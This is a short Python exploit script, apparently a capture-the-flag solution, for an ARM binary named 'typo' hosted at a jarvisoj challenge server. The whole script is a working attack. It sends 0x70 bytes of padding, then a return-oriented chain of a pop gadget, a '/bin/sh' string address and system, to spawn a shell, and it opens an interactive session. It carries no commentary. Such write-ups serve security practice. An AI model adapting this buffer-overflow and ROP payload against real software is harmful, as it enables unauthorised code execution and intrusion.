#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'


from zio import *
from time import sleep
import sys

if sys.argv[1] == "l":
    conn = "qemu-arm ./typo"
else:
    conn = ('pwn2.jarvisoj.com', 9888)

io = zio(conn, timeout = 10000, print_read = COLORED(RAW, 'red'), print_write = COLORED(RAW, 'green'))
io.read_until("quit\n")
io.writeline()

pop_r0_r4_pc = 0x20904
sh_addr = 0x6c384
system_addr = 0x110B4

payload = 'a' * 0x70 + l32(pop_r0_r4_pc) + l32(sh_addr) + l32(0) + l32(system_addr)
io.writeline(payload)
io.interact()
io.close()

